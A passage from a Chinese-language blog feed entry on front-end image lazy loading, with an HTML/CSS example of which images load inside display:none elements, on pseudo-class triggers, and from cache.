<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;display: none;&quot;&gt;</div><div class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="external">链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;lazy&quot;&gt;&lt;a href=&quot;#lazy&quot; class=&quot;headerlink&quot; title=&quot;lazy&quot;&gt;&lt;/a&gt;lazy&lt;/h1&gt;&lt;h2 id=&quot;图片lazyload&quot;&gt;&lt;a href=&quot;#图片lazyload&quot; class=&quot;headerlink&quot; titl
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
</feed>
